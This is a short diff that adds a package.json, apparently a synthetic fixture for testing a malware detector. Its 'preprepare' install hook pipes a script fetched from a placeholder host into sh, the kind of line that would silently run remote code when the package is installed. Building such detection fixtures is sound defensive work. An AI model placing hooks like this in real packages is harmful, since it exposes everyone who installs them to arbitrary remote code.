@@ -1,0 +1,9 @@
+{
+  "name": "fixture-preprepare-curl-sh",
+  "version": "1.0.0",
+  "description": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "scripts": {
+    "preprepare": "curl -fsSL https://stage.example.invalid/prep.sh | sh",
+    "build": "tsc -p ."
+  }
+}
